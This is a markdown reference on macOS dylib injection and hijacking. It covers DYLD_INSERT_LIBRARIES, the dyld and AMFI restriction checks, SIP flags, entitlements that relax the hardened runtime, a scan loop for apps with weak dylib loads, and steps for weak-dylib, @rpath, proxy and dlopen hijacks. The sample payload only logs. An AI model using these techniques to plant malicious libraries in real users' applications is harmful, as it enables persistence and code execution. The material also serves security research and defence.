# DYLIB Injection & Hijacking Reference

## DYLD_INSERT_LIBRARIES Injection

### Basic Dylib with Constructor

```c
// inject.c
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv) {
    printf("[INJECTED] PID: %d, binary: %s\n", getpid(), argv[0]);
    syslog(LOG_ERR, "[INJECTED] constructor called in %s", argv[0]);
}
```

### Build & Inject

```bash
gcc -dynamiclib inject.c -o inject.dylib
DYLD_INSERT_LIBRARIES=inject.dylib ./target_binary
```

### Monitor via Unified Log

```bash
log stream --style syslog --predicate 'eventMessage CONTAINS[c] "INJECTED"'
```

## Process Restriction Checks (What Blocks Injection)

### Old dyld (210.2.3) - pruneEnvironmentVariables

Removes all `DYLD_*` environment variables when ANY of these is true:

| Check | Condition |
|-------|-----------|
| **setuid/setgid** | `issetugid()` returns true |
| **__RESTRICT segment** | Binary has `__RESTRICT` segment with `__restrict` section |
| **CS_RESTRICT** | Code signing flag `CS_RESTRICT` (0x800) is set |

### New dyld (832.7.1) - configureProcessRestrictions

```
hasRestrictedSegment → set amfiInputFlags
     ↓
amfi_check_dyld_policy_self(amfiInputFlags, &amfiOutputFlags)
     ↓
Parse amfiOutputFlags → set gLinkContext.allow* booleans
```

### AMFI Output Flags

| Flag | Bit | Meaning |
|------|-----|---------|
| `AMFI_DYLD_OUTPUT_ALLOW_AT_PATH` | 1<<0 | Allow @path load commands |
| `AMFI_DYLD_OUTPUT_ALLOW_PATH_VARS` | 1<<1 | Allow DYLD_* path variables |
| `AMFI_DYLD_OUTPUT_ALLOW_CUSTOM_SHARED_CACHE` | 1<<2 | Allow custom shared cache |
| `AMFI_DYLD_OUTPUT_ALLOW_FALLBACK_PATHS` | 1<<3 | Allow fallback library paths |
| `AMFI_DYLD_OUTPUT_ALLOW_PRINT_VARS` | 1<<4 | Allow DYLD_PRINT_* |
| `AMFI_DYLD_OUTPUT_ALLOW_FAILED_LIBRARY_INSERTION` | 1<<5 | Allow graceful insertion failure |
| `AMFI_DYLD_OUTPUT_ALLOW_LIBRARY_INTERPOSING` | 1<<6 | Allow function interposing |

### AMFI Internal Call Chain

```
amfi_check_dyld_policy_self
  → ___sandbox_ms("AMFI", 0x5a, ...)
    → __mac_syscall (syscall 0x200017d)
      → AMFI.kext MACF policy_syscall
        → check_dyld_policy_internal
          → macos_dyld_policy_collect_state
            checks: csr_check (SIP)
                    cs_restricted (CS_RESTRICT flag)
                    proc_issetugid
                    cs_require_lv (library validation)
                    csproc_hardened_runtime
                    entitlements
```

### csops Syscall (169) - Code Signing Status Flags

```c
// Query flags:
#define CS_OPS_STATUS       0   // Get cs_flags
// Flag values:
#define CS_RESTRICT         0x0000800   // Restrict DYLD env vars
#define CS_REQUIRE_LV       0x0002000   // Library validation
#define CS_RUNTIME          0x0010000   // Hardened runtime
```

## Creating Restricted Binaries (Testing)

```bash
# SUID binary
sudo chown root binary
sudo chmod +s binary

# __RESTRICT segment
gcc -sectcreate __RESTRICT __restrict /dev/null hello.c -o hello-restricted

# Hardened runtime
codesign -s "Developer ID" --option=runtime binary

# Library validation
codesign -s "Developer ID" --option=library binary

# CS_RESTRICT flag
codesign -s "Developer ID" --option=0x800 binary
```

### Entitlements to Bypass Restrictions

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "...">
<plist version="1.0">
<dict>
    <key>com.apple.security.cs.allow-dyld-environment-variables</key>
    <true/>
    <key>com.apple.security.cs.disable-library-validation</key>
    <true/>
</dict>
</plist>
```

```bash
codesign -s "identity" --entitlements entitlements.plist --option=runtime binary
```

## SIP Internals

```c
// csrActiveConfig bits (from csr.h):
#define CSR_ALLOW_UNTRUSTED_KEXTS           (1 << 0)
#define CSR_ALLOW_UNRESTRICTED_FS            (1 << 1)
#define CSR_ALLOW_TASK_FOR_PID              (1 << 2)
#define CSR_ALLOW_KERNEL_DEBUGGER           (1 << 3)
#define CSR_ALLOW_APPLE_INTERNAL            (1 << 4)
#define CSR_ALLOW_UNRESTRICTED_DTRACE       (1 << 5)
#define CSR_ALLOW_UNRESTRICTED_NVRAM        (1 << 6)
```

## Dylib Hijacking

### Load Command Types

| LC | Behavior |
|----|----------|
| `LC_LOAD_DYLIB` | Required - app crashes if dylib missing |
| `LC_LOAD_WEAK_DYLIB` | Optional - app continues if missing |
| `LC_REEXPORT_DYLIB` | Re-export all symbols from another dylib |
| `LC_LOAD_UPWARD_DYLIB` | Upward dependency (circular reference) |

### @rpath Resolution

```
LC_RPATH entries define search paths (checked in order)
@rpath/libfoo.dylib → try each LC_RPATH + /libfoo.dylib

@loader_path  = directory containing the binary with the load command
@executable_path = directory containing the main executable
```

Example: Binary at `/Applications/App.app/Contents/MacOS/App`
```
LC_RPATH: @loader_path/../Frameworks
LC_LOAD_DYLIB: @rpath/Foo.dylib
→ Searches: /Applications/App.app/Contents/Frameworks/Foo.dylib
```

### Hijacking Scenarios

**1. Missing Weak Dylib**
```bash
# Find weak dylib references
otool -l binary | grep LC_LOAD_WEAK_DYLIB -A 5
# Check if dylib actually exists at specified path
ls -la /path/from/output
# If missing: place malicious dylib at that path
```

**2. @rpath Search Order**
```bash
# List all rpath entries
otool -l binary | grep -A2 LC_RPATH
# If earlier rpath directory is writable but dylib lives in later one:
# Place hijack dylib in the earlier search path
```

**3. Dylib Proxying (Swap + Re-export)**

Replace original dylib with malicious one that re-exports all original symbols:

```bash
# Compile hijack dylib that re-exports the original
gcc -dynamiclib hijack.c -o hijack.dylib \
    -current_version 1.0 \
    -compatibility_version 1.0 \
    -Wl,-reexport_library,"/path/to/original.dylib"

# Fix install name if needed
install_name_tool -change \
    @rpath/lib.dylib \
    "/full/path/to/original.dylib" \
    hijack.dylib
```

### Finding Vulnerable Applications

```bash
# 1. Find apps with weak dylib loads
for app in /Applications/*.app; do
    binary="$app/Contents/MacOS/$(defaults read "$app/Contents/Info.plist" CFBundleExecutable 2>/dev/null)"
    if [ -f "$binary" ]; then
        weak=$(otool -l "$binary" 2>/dev/null | grep -c LC_LOAD_WEAK_DYLIB)
        if [ "$weak" -gt 0 ]; then
            echo "$binary: $weak weak dylibs"
        fi
    fi
done

# 2. Check if target dylib exists
otool -l binary | grep LC_LOAD_WEAK_DYLIB -A5

# 3. Verify codesign doesn't block injection
codesign -dvv binary 2>&1 | grep -E 'Runtime|Library'
```

### Version Matching

Hijack dylib must match or exceed the target's compatibility version:

```bash
# Check required version
otool -l binary | grep -A5 "LC_LOAD.*DYLIB" | grep -E "version|name"

# Set version at compile time
gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 ...
```

## dlopen Hijacking

### Search Order (no slash in path)

For unrestricted binaries:
1. `$LD_LIBRARY_PATH`
2. `$DYLD_LIBRARY_PATH`
3. Current working directory
4. `$DYLD_FALLBACK_LIBRARY_PATH`
   - Default fallback: `$HOME/lib`, `/usr/local/lib`, `/usr/lib`

For restricted binaries: only searches `/usr/lib` (SIP-protected).

### Monitoring dlopen Searches

```bash
# Watch filesystem access to find search paths
sudo fs_usage -f filesystem processname 2>/dev/null | grep libname

# Or with DTrace
sudo dtrace -n 'syscall::open*:entry /execname == "target"/ {
    printf("%s", copyinstr(arg0));
}'
```

### dlopen Hijack Steps

1. Run `fs_usage` while target calls `dlopen("libname")`
2. Observe which paths are searched (stat/open calls)
3. Place malicious dylib in first writable search location
4. Ensure dylib exports expected symbols
